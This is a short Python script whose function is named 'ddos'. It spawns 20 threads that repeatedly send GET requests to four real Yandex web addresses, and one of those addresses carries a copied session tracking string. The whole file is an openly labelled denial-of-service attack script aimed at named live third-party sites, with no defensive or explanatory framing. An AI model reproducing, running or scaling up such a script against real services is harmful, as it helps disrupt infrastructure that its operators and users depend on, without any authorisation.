import requests
import threading

http_list = ['https://ya.ru/', 'https://market.yandex.ru/?clid=505&utm_source=main_stripe_big&src_pof=505&icookie=hVBAmzeIGOxOdyur7QRAOjomWQpIU9KrrVjmeeyM6F3UngD58qJPPKzlecDbwucFtwOjUuMETF3Yf3LcbUiOs%2BtjKUc%3D&utm_source_service=morda', 'https://yandex.ru/news/?utm_source=main_stripe_big', 'https://yandex.ru/images/?utm_source=main_stripe_big']

def ddos():
    for http in http_list:
        print(http)
        for i in range(10):
            a = requests.get(http)
            print(i, a)
        

for j in range(20):
    threading.Thread(target=ddos).start()